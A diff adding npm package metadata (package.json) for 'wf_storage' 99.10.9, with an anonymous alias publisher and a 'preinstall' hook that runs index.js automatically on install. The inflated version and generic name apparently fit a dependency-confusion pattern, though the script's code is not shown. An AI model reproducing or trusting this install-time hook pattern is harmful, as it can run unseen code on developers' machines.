@@ -1,0 +1,45 @@
+{
+    "name": "wf_storage",
+    "version": "99.10.9",
+    "description": "Storage Utilities",
+    "License": "ISC",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "_id": "wf_storage@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-KQU075ZZq2taXhl6MK7aLUFSnNiIg66j38oe/iLxSOHXJFvWnL0oSC4rlNvg46rPj9wegdKCgSXZq8jRaFKxUg==",
+        "shasum": "baeeaff7f098502a63adb5924571cec58d85dc76",
+        "tarball": "https://registry.npmjs.org/wf_storage/-/wf_storage-99.10.9.tgz",
+        "fileCount": 4,
+        "unpackedSize": 9630,
+        "signatures": [
+            {
+                "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+                "sig": "MEUCIQCR20CgbbZcjhnHTTDccnbzEx+lgIWxBDFFsPdLK7VqWQIgWHh/TptRQn9ITonjcA6O8P6CXajD489HslNgz84XHeQ="
+            }
+        ],
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiVqrKACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmroiA/+Pp6E3dKk370RhXFakUg4Rp+ovALhO44Lqp1rRBlvWgKS6zUd\r\nZt2E+R1MeO++VkzgtmLs9UfbBvNP2Rq+GlenMsR9/2Kp1wdc5DXsmI42dtgT\r\nftmd1IICiFG/tUVw6JPc251X0tT7EFp+Rhyj9yDW2QlpT+Tpm6X8cfG4wJvW\r\nc2yYcBkzqRXN8tmxiVrsAITO0Hgo2oLHv+eovCbMfqJK6VPt7BD9Dr2nIy/4\r\nV3TS9mHqwYzCGSzFyk4HRA2aNldzIh8lY6IAuNUpE7PA+FcqPm+iOC8S8z5x\r\nBJ+Yr8DOAyVUvxcBmzzgO9RTJ/zMDVmUPLba11sELFr4aIbALzrlPwvgXIpj\r\nWI10KThZpYy5YrVVOlwbpZ/W76HLqhu1TYqWF1WKkTnKA+4ktSJ699cyCyQ+\r\nc9v9tpbJBj/ebyxGiW/uFBYUdp6oF2sDafJjeq1BigD5v8+ipf0wg5noPese\r\nH61LDrr/yag+Wx4FSbF4kiWvbkXQeLKdY8UshNZrNzaRnf3ckDRDxttELhMj\r\n1/oYKkHSJr7wfKvU11DqPtbjKm410hnPiYgPAfD3Ef2IwkhilaJGfZPJCwBm\r\now4ms3tR74QRdqfGHis0W7CrfkSjTB2wnXNswsxV6rh2q6PgtCItyrk9LRCQ\r\nXAq64+ovvcLrvz9NjNt6UbdS0XwHXcoFTgc=\r\n=iD4j\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "leftwing_tenore",
+        "email": "leftwing_tenore@aleeas.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "leftwing_tenore",
+            "email": "leftwing_tenore@aleeas.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/wf_storage_99.10.9_1649846986125_0.9678667311392903"
+    },
+    "_hasShrinkwrap": false
+}
